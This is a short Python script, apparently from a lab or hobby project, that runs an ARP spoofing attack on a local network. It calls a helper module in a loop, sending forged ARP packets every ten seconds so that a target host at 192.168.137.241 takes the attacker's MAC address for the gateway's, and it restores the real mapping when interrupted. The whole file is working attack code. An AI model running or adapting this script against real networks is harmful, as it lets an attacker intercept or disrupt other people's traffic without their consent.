from  arp_poison import *

print("\nSpoof attack started...")
try:
    while True:
        # broadcast malicious ARP packets
        spoof_attack('cc:b0:da:46:1e:a9','192.168.137.1','192.168.137.241','F0:0F:EC:79:08:9D')
        time.sleep(10)

except KeyboardInterrupt:
    # re-arp target on KeyboardInterrupt exception
    print("\nSpoof attack stopping...")
    reArp = 1
    while reArp != 10:
        try:
            # broadcast ARP packets with legitimate info to restore connection
            spoof_attack('54:8C:A0:91:E1:BB','192.168.137.1','192.168.137.241','F0:0F:EC:79:08:9D')
        except KeyboardInterrupt:
            pass
        
        reArp += 1
        time.sleep(0.2)
    print("Successfully stopped the ARP Spoofing attack")
